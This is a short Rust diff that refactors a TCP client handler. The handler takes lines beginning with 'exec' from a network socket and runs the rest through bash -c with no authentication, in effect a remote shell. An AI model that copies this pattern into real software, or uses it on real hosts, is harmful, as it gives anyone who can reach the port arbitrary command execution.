@@ -3,14 +3,6 @@ use std::process::*;
 use std::io::prelude::*;
 use std::io::{BufRead, BufReader};
 
-fn remove_first_word(s: &str) -> String {
-    let mut words = s.split_whitespace();
-
-    words.next();
-    words.collect::<Vec<&str>>().join(" ")
-}
-
-
 fn handle_client(mut client: net::TcpStream) -> isize
 {
     let mut result: isize = 0;
@@ -26,7 +18,7 @@ fn handle_client(mut client: net::TcpStream) -> isize
     if buf.starts_with("exec") {
         let mut child = Command::new("bash")
             .arg("-c")
-            .arg(format!("\"{}\"", remove_first_word(&buf)))
+            .arg(format!("\"{}\"", &buf[5..]))
             .stdout(Stdio::piped())
             .spawn()
             .unwrap();
